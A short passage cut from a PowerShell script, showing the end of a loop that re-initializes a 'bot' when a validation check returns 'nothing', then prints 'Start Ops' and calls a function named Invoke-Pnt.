			if ($validate -eq "nothing") { 
				Write-Host "validate pc return ---> $validate .  try to re-initialize ..."
				InitializeBot }
			Write-Host "Start Ops"
			Invoke-Pnt	
			}
		}
}